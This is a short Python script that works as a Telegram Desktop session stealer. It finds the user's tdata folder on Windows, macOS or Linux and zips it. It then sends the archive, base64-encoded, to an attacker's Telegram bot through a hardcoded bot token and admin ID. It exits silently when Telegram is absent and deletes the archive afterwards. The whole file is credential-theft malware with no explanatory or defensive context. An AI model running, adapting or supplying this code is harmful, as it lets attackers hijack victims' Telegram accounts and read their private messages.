import os
import sys
import json
import base64
import shutil
import platform
import tempfile
import requests
import zipfile
from pathlib import Path

# Configuration
BOT_TOKEN = "8645277237:AAFhhiswfRoG75slsYJlFkwEvWr8Fmg8_UI"  # bot token
ADMIN_ID = 8564420987  # your Telegram ID

# Constants
ARCHIVE_PATH = Path(tempfile.gettempdir()) / "tdata.zip"
OS_NAME = platform.system()

def find_tdata_path() -> Path | None:
    """Returns the path to the Telegram Desktop tdata folder."""
    home_dir = Path.home()
    candidates = {
        "Windows": home_dir / "AppData" / "Roaming" / "Telegram Desktop" / "tdata",
        "Darwin": home_dir / "Library" / "Application Support" / "Telegram Desktop" / "tdata",
        "Linux": home_dir / ".local" / "share" / "TelegramDesktop" / "tdata",
    }
    path = candidates.get(OS_NAME)
    return path if path and path.is_dir() else None

def zip_folder(src_path: Path, dst_path: Path) -> None:
    """Archives the entire folder."""
    with zipfile.ZipFile(dst_path, 'w', zipfile.ZIP_DEFLATED) as zip_file:
        for file in src_path.rglob("*"):
            zip_file.write(file, file.relative_to(src_path.parent))

def exfiltrate_data(url: str, user_id: int, file_path: Path) -> None:
    """Sends the base64-encoded zip file to the bot."""
    with file_path.open('rb') as file:
        b64_data = base64.b64encode(file.read()).decode()
    caption = f"tdata uid={user_id} os={OS_NAME}"
    payload = {
        "chat_id": user_id,
        "caption": caption,
        "document": f"data:application/zip;base64,{b64_data}",
        "filename": "tdata.zip",
    }
    requests.post(f"https://api.telegram.org/bot{url}/sendDocument", data=payload)


def main() -> None:
    tdata_path = find_tdata_path()
    if not tdata_path:
        sys.exit(0)  # exit quietly if Telegram is not found
    zip_folder(tdata_path, ARCHIVE_PATH)
    exfiltrate_data(BOT_TOKEN, ADMIN_ID, ARCHIVE_PATH)
    ARCHIVE_PATH.unlink(missing_ok=True)  # clean up

if __name__ == "__main__":
    main()
